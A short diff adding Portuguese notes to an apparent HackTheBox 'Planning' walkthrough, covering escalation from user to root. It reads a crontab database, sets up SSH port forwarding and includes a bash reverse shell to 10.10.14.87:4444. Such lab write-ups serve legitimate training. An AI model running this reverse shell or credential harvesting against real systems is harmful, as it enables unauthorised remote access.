@@ -12,3 +12,13 @@ ssh enzo@ip
 ja obitivemos a user.txt
 
 
+cat /opt/crontabs/crontab.db
+
+netstat -tuln
+sh -L 8000:127.0.0.1:8000 enzo@planning.htb
+root:senha do crontabs
+
+/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.87/4444 0>&1'
+terminado com a flag root
+
+
